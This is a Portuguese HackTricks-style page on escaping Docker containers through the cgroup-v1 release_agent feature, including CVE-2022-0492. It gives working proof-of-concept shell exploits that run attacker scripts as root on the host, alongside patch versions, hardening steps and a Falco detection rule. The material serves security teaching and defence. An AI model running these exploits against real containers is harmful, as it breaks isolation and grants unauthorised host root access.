# Docker release_agent cgroups escape

{{#include ../../../../banners/hacktricks-training.md}}

**Para mais detalhes, consulte o** [**post original do blog**](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/)**.** Este é apenas um resumo:

---

## PoC Clássica (2019)
```shell
d=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`
mkdir -p $d/w;echo 1 >$d/w/notify_on_release
t=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
touch /o; echo $t/c >$d/release_agent;echo "#!/bin/sh
$1 >$t/o" >/c;chmod +x /c;sh -c "echo 0 >$d/w/cgroup.procs";sleep 1;cat /o
```
A PoC explora o recurso **cgroup-v1** `release_agent`: quando a última tarefa de um cgroup que tem `notify_on_release=1` sai, o kernel (nos **namespaces iniciais no host**) executa o programa cujo caminho está armazenado no arquivo gravável `release_agent`. Como essa execução acontece com **plenos privilégios de root no host**, obter acesso de gravação ao arquivo é suficiente para uma fuga de container.

### Passo a passo curto e legível

1. **Preparar um novo cgroup**

```shell
mkdir /tmp/cgrp
mount -t cgroup -o rdma cgroup /tmp/cgrp   # ou –o memory
mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
```

2. **Apontar `release_agent` para um script controlado pelo atacante no host**

```shell
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/cmd" > /tmp/cgrp/release_agent
```

3. **Dropar o payload**

```shell
cat <<'EOF' > /cmd
#!/bin/sh
ps aux > "$host_path/output"
EOF
chmod +x /cmd
```

4. **Acionar o notificador**

```shell
sh -c "echo $$ > /tmp/cgrp/x/cgroup.procs"   # adicionar a nós mesmos e sair imediatamente
cat /output                                  # agora contém processos do host
```

---

## Vulnerabilidade do kernel de 2022 – CVE-2022-0492

Em fevereiro de 2022, Yiqi Sun e Kevin Wang descobriram que **o kernel *não* verificava capacidades quando um processo escrevia em `release_agent` no cgroup-v1** (função `cgroup_release_agent_write`).

Efetivamente, **qualquer processo que pudesse montar uma hierarquia de cgroup (por exemplo, via `unshare -UrC`) poderia escrever um caminho arbitrário em `release_agent` sem `CAP_SYS_ADMIN` no *namespace* de usuário *inicial***. Em um container Docker/Kubernetes configurado por padrão e rodando como root, isso permitiu:

* escalonamento de privilégios para root no host; ↗
* fuga de container sem que o container fosse privilegiado.

A falha foi atribuída como **CVE-2022-0492** (CVSS 7.8 / Alto) e corrigida nas seguintes versões do kernel (e todas as posteriores):

* 5.16.2, 5.15.17, 5.10.93, 5.4.176, 4.19.228, 4.14.265, 4.9.299.

Commit do patch: `1e85af15da28 "cgroup: Fix permission checking"`.

### Exploit mínimo dentro de um container
```bash
# prerequisites: container is run as root, no seccomp/AppArmor profile, cgroup-v1 rw inside
apk add --no-cache util-linux  # provides unshare
unshare -UrCm sh -c '
mkdir /tmp/c; mount -t cgroup -o memory none /tmp/c;
echo 1 > /tmp/c/notify_on_release;
echo /proc/self/exe > /tmp/c/release_agent;     # will exec /bin/busybox from host
(sleep 1; echo 0 > /tmp/c/cgroup.procs) &
while true; do sleep 1; done
'
```
Se o kernel for vulnerável, o binário busybox do *host* é executado com acesso total de root.

### Dureza e Mitigações

* **Atualize o kernel** (≥ versões acima). O patch agora requer `CAP_SYS_ADMIN` no *namespace* de usuário *inicial* para escrever em `release_agent`.
* **Prefira cgroup-v2** – a hierarquia unificada **removeu completamente o recurso `release_agent`**, eliminando essa classe de escapes.
* **Desative namespaces de usuário não privilegiados** em hosts que não precisam deles:
```shell
sysctl -w kernel.unprivileged_userns_clone=0
```
* **Controle de acesso obrigatório**: Políticas do AppArmor/SELinux que negam `mount`, `openat` em `/sys/fs/cgroup/**/release_agent`, ou removem `CAP_SYS_ADMIN`, impedem a técnica mesmo em kernels vulneráveis.
* **Bind-mask somente leitura** para todos os arquivos `release_agent` (exemplo de script Palo Alto):
```shell
for f in $(find /sys/fs/cgroup -name release_agent); do
mount --bind -o ro /dev/null "$f"
done
```

## Detecção em tempo de execução

[`Falco`](https://falco.org/) inclui uma regra embutida desde a v0.32:
```yaml
- rule: Detect release_agent File Container Escapes
desc: Detect an attempt to exploit a container escape using release_agent
condition: open_write and container and fd.name endswith release_agent and
(user.uid=0 or thread.cap_effective contains CAP_DAC_OVERRIDE) and
thread.cap_effective contains CAP_SYS_ADMIN
output: "Potential release_agent container escape (file=%fd.name user=%user.name cap=%thread.cap_effective)"
priority: CRITICAL
tags: [container, privilege_escalation]
```
A regra é acionada em qualquer tentativa de escrita em `*/release_agent` de um processo dentro de um contêiner que ainda possui `CAP_SYS_ADMIN`.

## Referências

* [Unit 42 – CVE-2022-0492: container escape via cgroups](https://unit42.paloaltonetworks.com/cve-2022-0492-cgroups/) – análise detalhada e script de mitigação.
* [Sysdig Falco rule & detection guide](https://sysdig.com/blog/detecting-mitigating-cve-2022-0492-sysdig/)

{{#include ../../../../banners/hacktricks-training.md}}
